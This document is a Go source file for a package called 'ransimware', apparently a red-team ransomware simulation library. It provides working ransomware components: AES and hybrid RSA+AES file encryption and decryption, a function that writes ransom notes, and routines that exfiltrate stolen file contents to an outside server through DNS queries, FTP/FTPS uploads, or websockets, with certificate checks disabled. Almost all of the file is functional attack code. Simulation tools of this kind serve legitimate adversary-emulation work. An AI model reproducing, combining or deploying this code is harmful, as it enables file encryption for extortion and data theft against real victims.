package ransimware

import (
	"bytes"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	ws "github.com/gorilla/websocket"
	"github.com/mjwhitta/errors"
	"github.com/mjwhitta/ftp"
)

// DefaultEncrypt is the default encryption behavior.
var DefaultEncrypt = func(path string, b []byte) ([]byte, error) {
	return b, nil
}

// DefaultExfil is the default exfil behavior.
var DefaultExfil = func(path string, b []byte) error {
	return nil
}

// DefaultNotify is the default notify behavior.
var DefaultNotify = func() error {
	return nil
}

// AESDecrypt will return a function pointer to an EncryptFunc that
// actually decrypts using the specified password.
func AESDecrypt(passwd string) EncryptFunc {
	return func(path string, b []byte) ([]byte, error) {
		var block cipher.Block
		var e error
		var iv [sha256.Size]byte = sha256.Sum256([]byte("redteam"))
		var key [sha256.Size]byte = sha256.Sum256([]byte(passwd))
		var stream cipher.Stream

		if len(b) < aes.BlockSize {
			return b, errors.New("ciphertext too short")
		}

		if block, e = aes.NewCipher(key[:]); e != nil {
			e = errors.Newf("failed to create AES cipher: %w", e)
			return b, e
		}

		// Ensure the file was encrypted with ransimware
		for i := 0; i < aes.BlockSize; i++ {
			if iv[i] != b[i] {
				return b, nil
			}
		}
		b = b[aes.BlockSize:]

		stream = cipher.NewCFBDecrypter(block, iv[:aes.BlockSize])
		stream.XORKeyStream(b, b)

		return b, nil
	}
}

// AESEncrypt will return a function pointer to an EncryptFunc that
// uses the specified password.
func AESEncrypt(passwd string) EncryptFunc {
	return func(path string, b []byte) ([]byte, error) {
		var block cipher.Block
		var ctxt []byte
		var e error
		var iv [sha256.Size]byte = sha256.Sum256([]byte("redteam"))
		var key [sha256.Size]byte = sha256.Sum256([]byte(passwd))
		var stream cipher.Stream

		if block, e = aes.NewCipher(key[:]); e != nil {
			e = errors.Newf("failed to create AES cipher: %w", e)
			return b, e
		}

		ctxt = make([]byte, aes.BlockSize+len(b))
		for i := 0; i < aes.BlockSize; i++ {
			ctxt[i] = iv[i]
		}

		stream = cipher.NewCFBEncrypter(block, iv[:aes.BlockSize])
		stream.XORKeyStream(ctxt[aes.BlockSize:], b)

		return ctxt, nil
	}
}

// Base64Encode will "encrypt" using base64, obvs.
func Base64Encode(path string, b []byte) ([]byte, error) {
	return []byte(base64.StdEncoding.EncodeToString(b)), nil
}

// DNSResolvedExfil will return a function pointer to an ExfilFunc
// that exfils by sending DNS queries to the authoritative nameserver
// for the specified domain.
func DNSResolvedExfil(domain string) (ExfilFunc, error) {
	var f ExfilFunc = func(path string, b []byte) error {
		var b64 string
		var data []byte = append([]byte(path+" "), b...)
		var done bool
		var e error
		var fqdn string
		var label string
		var leftover string
		var max int = 253 - len(domain) - 1
		var special map[byte]string = map[byte]string{
			'+': ".plus",
			'/': ".slash",
			'=': ".equal",
		}
		var stream *bytes.Reader
		var tmp byte
		var uuid [24]byte

		// Get UUID
		if _, e = rand.Read(uuid[:]); e != nil {
			return errors.Newf("failed to read random data: %w", e)
		}

		// Base64 encode data
		b64 = base64.StdEncoding.EncodeToString(data)
		stream = bytes.NewReader([]byte(b64))

		// Stream data via DNS queries
		for !done || (leftover != "") {
			// Account for leftover from last loop
			fqdn = hex.EncodeToString(uuid[:]) + leftover
			leftover = ""

			// Create fqdn
			for !done {
				// Create label
				label = ""
				for !done {
					// Read 1 byte at a time
					if tmp, e = stream.ReadByte(); e == io.EOF {
						done = true
						break
					} else if e != nil {
						e = errors.Newf("failed reading data: %w", e)
						return e
					}

					// Check for special chars
					if _, ok := special[tmp]; ok {
						if len(fqdn+"."+label+special[tmp]) > max {
							leftover = special[tmp]
						} else {
							label += special[tmp]
						}

						break
					} else {
						label += string(tmp)
					}

					// Check label length
					if len(label) >= 63 {
						break
					}
				}

				// Check fqdn length
				if len(fqdn+"."+label) > max {
					leftover = "." + label
					break
				} else {
					fqdn += "." + label
				}
			}

			net.LookupIP(fqdn)
		}

		return nil
	}

	return f, nil
}

// FTPExfil will return a function pointer to an ExfilFunc that
// exfils via an FTP connection.
func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
	var c *ftp.ServerConn
	var e error
	var f ExfilFunc
	var m *sync.Mutex = &sync.Mutex{}
	var secure bool

	// Remove leading protocol
	if strings.HasPrefix(dst, "ftp://") {
		dst = strings.Replace(dst, "ftp://", "", 1)
	} else if strings.HasPrefix(dst, "ftps://") {
		dst = strings.Replace(dst, "ftps://", "", 1)
		secure = true
	}

	// Connect to FTP server
	if !secure {
		c, e = ftp.Dial(dst, ftp.DialWithTimeout(5*time.Second))
	} else {
		// Skip verify in case user is using self-signed cert
		c, e = ftp.Dial(
			dst,
			ftp.DialWithTimeout(5*time.Second),
			ftp.DialWithExplicitTLS(
				&tls.Config{InsecureSkipVerify: true},
			),
		)
	}
	if e != nil {
		return nil, errors.Newf("failed FTP connection: %w", e)
	}

	// Authenticate
	if e = c.Login(user, passwd); e != nil {
		return nil, errors.Newf("failed to login: %w", e)
	}

	f = func(path string, b []byte) error {
		if strings.HasPrefix(path, "/") {
			path = strings.Replace(path, "/", "", 1)
		}

		// Fix slashes
		path = filepath.ToSlash(path)

		m.Lock()
		defer m.Unlock()

		// Make dirs
		c.MakeDirRecur(filepath.Dir(path))

		// Upload file
		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
			return errors.Newf("failed to upload %s: %w", path, e)
		}

		return nil
	}

	return f, nil
}

// FTPParallelExfil will return a function pointer to an ExfilFunc
// that exfils via multiple FTP connections.
func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
	var f ExfilFunc
	var secure bool

	// Remove leading protocol
	if strings.HasPrefix(dst, "ftp://") {
		dst = strings.Replace(dst, "ftp://", "", 1)
	} else if strings.HasPrefix(dst, "ftps://") {
		dst = strings.Replace(dst, "ftps://", "", 1)
		secure = true
	}

	f = func(path string, b []byte) error {
		var c *ftp.ServerConn
		var e error

		if strings.HasPrefix(path, "/") {
			path = strings.Replace(path, "/", "", 1)
		}

		// Connect to FTP server
		if !secure {
			c, e = ftp.Dial(dst, ftp.DialWithTimeout(5*time.Second))
		} else {
			// Skip verify in case user is using self-signed cert
			c, e = ftp.Dial(
				dst,
				ftp.DialWithTimeout(5*time.Second),
				ftp.DialWithExplicitTLS(
					&tls.Config{InsecureSkipVerify: true},
				),
			)
		}
		if e != nil {
			return errors.Newf("failed FTP connection: %w", e)
		}

		// Authenticate
		if e = c.Login(user, passwd); e != nil {
			return errors.Newf("failed to login: %w", e)
		}

		// Fix slashes
		path = filepath.ToSlash(path)

		// Make dirs
		c.MakeDirRecur(filepath.Dir(path))

		// Upload file
		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
			return errors.Newf("failed to upload %s: %w", path, e)
		}

		return nil
	}

	return f, nil
}

// RansomNote will return a function pointer to a NotifyFunc that
// appends the specified text to the specified file.
func RansomNote(path string, text ...string) NotifyFunc {
	return func() error {
		var e error
		var f *os.File

		f, e = os.OpenFile(
			path,
			os.O_APPEND|os.O_CREATE|os.O_RDWR,
			0o644,
		)
		if e != nil {
			return errors.Newf("failed to open %s: %w", path, e)
		}
		defer f.Close()

		for _, line := range text {
			f.WriteString(line + "\n")
		}

		return nil
	}
}

// RSADecrypt will return a function pointer to an EncryptFunc that
// actually decrypts using the specified private key. The private key
// is used to decrypt an OTP used with AES for a hybrid RSA+AES
// scheme.
func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
	return func(path string, b []byte) ([]byte, error) {
		var b64 []byte
		var ctxt []byte
		var e error
		var key []byte
		var n int
		var otp []byte
		var ptxt []byte

		// Ensure the file was encrypted with ransimware
		if string(b[:10]) != "ransimware" {
			return b, nil
		}
		ctxt = b[10:]

		// Get key for AES decryption
		for i, c := range ctxt {
			if c == '\n' {
				b64 = ctxt[:i]
				ctxt = ctxt[i+1:]
				break
			}
		}

		// Base64 decode key
		key = make([]byte, base64.StdEncoding.DecodedLen(len(b64)))
		if n, e = base64.StdEncoding.Decode(key, b64); e != nil {
			return b, errors.Newf("failed to base64 decode: %w", e)
		}

		// RSA decrypt the OTP
		otp, e = priv.Decrypt(
			nil,
			key[:n],
			&rsa.OAEPOptions{Hash: crypto.SHA256},
		)
		if e != nil {
			return b, errors.Newf("failed to RSA decrypt OTP: %w", e)
		}

		// AES decrypt remaining contents using helper function
		if ptxt, e = AESDecrypt(string(otp))(path, ctxt); e != nil {
			return b, e
		}

		return ptxt, nil
	}
}

// RSAEncrypt will return a function pointer to an EncryptFunc that
// uses the specified public key. The public key is used to encrypt an
// OTP used with AES for a hybrid RSA+AES scheme.
func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
	return func(path string, b []byte) ([]byte, error) {
		var b64 []byte
		var ctxt []byte
		var e error
		var final []byte
		var key []byte
		var otp [sha256.Size]byte

		// Generate random OTP for AES encryption
		if _, e = rand.Read(otp[:]); e != nil {
			return b, errors.Newf("failed to read random data: %w", e)
		}

		// RSA encrypt the OTP
		key, e = rsa.EncryptOAEP(
			sha256.New(),
			rand.Reader,
			pub,
			otp[:],
			nil,
		)
		if e != nil {
			return b, errors.Newf("failed to RSA encrypt OTP: %w", e)
		}

		// Base64 encode key
		b64 = make([]byte, base64.StdEncoding.EncodedLen(len(key)))
		base64.StdEncoding.Encode(b64, key)

		// AES encrypt using helper function
		if ctxt, e = AESEncrypt(string(otp[:]))(path, b); e != nil {
			return b, e
		}

		// Create hybrid structure
		final = []byte("ransimware")   // tag
		final = append(final, b64...)  // RSA encrypted key in base64
		final = append(final, '\n')    // separator
		final = append(final, ctxt...) // AES encrypted data

		return final, nil
	}
}

func wait(t time.Time, waitEvery, waitFor time.Duration) time.Time {
	if (waitEvery > 0) && (time.Since(t) > waitEvery) {
		time.Sleep(waitFor)
		return time.Now()
	}

	return t
}

// WebsocketExfil will return a function pointer to an ExfilFunc that
// exfils via a websocket connection.
func WebsocketExfil(
	dst string,
	headers map[string]string,
	proxy ...string,
) (ExfilFunc, error) {
	var c *ws.Conn
	var dialer *ws.Dialer
	var e error
	var f ExfilFunc
	var hdrs http.Header = map[string][]string{}
	var m *sync.Mutex = &sync.Mutex{}
	var tmp *url.URL

	// Set headers
	for k, v := range headers {
		hdrs.Set(k, v)
	}

	// Skip verify in case user is using self-signed cert
	dialer = ws.DefaultDialer
	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Use proxy if provided
	if len(proxy) > 0 {
		if tmp, e = url.Parse(proxy[0]); e != nil {
			return nil, errors.Newf("failed to parse proxy: %w", e)
		}

		dialer.Proxy = http.ProxyURL(tmp)
	}

	// Connect to Websocket
	if c, _, e = dialer.Dial(dst, hdrs); e != nil {
		return nil, errors.Newf("failed Websocket connection: %w", e)
	}

	f = func(path string, b []byte) error {
		var b64 string = base64.StdEncoding.EncodeToString(b)
		var data []byte
		var e error

		if path != "" {
			data = []byte(path + " " + b64)
		} else {
			data = []byte(b64)
		}

		m.Lock()
		e = c.WriteMessage(ws.TextMessage, data)
		m.Unlock()

		return e
	}

	return f, nil
}

// WebsocketParallelExfil will return a function pointer to an
// ExfilFunc that exfils via multiple websocket connections.
func WebsocketParallelExfil(
	dst string,
	headers map[string]string,
	proxy ...string,
) (ExfilFunc, error) {
	var dialer *ws.Dialer
	var e error
	var f ExfilFunc
	var hdrs http.Header = map[string][]string{}
	var tmp *url.URL

	// Set headers
	for k, v := range headers {
		hdrs.Set(k, v)
	}

	// Skip verify in case user is using self-signed cert
	dialer = ws.DefaultDialer
	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Use proxy if provided
	if len(proxy) > 0 {
		if tmp, e = url.Parse(proxy[0]); e != nil {
			return nil, errors.Newf("failed to parse proxy: %w", e)
		}

		dialer.Proxy = http.ProxyURL(tmp)
	}

	f = func(path string, b []byte) error {
		var b64 string = base64.StdEncoding.EncodeToString(b)
		var c *ws.Conn
		var data []byte
		var e error

		// Connect to Websocket
		if c, _, e = dialer.Dial(dst, hdrs); e != nil {
			return errors.Newf("failed Websocket connection: %w", e)
		}
		defer func() {
			c.WriteMessage(
				ws.CloseMessage,
				ws.FormatCloseMessage(ws.CloseNormalClosure, ""),
			)
			c.Close()
		}()

		if path != "" {
			data = []byte(path + " " + b64)
		} else {
			data = []byte(b64)
		}

		return c.WriteMessage(ws.TextMessage, data)
	}

	return f, nil
}
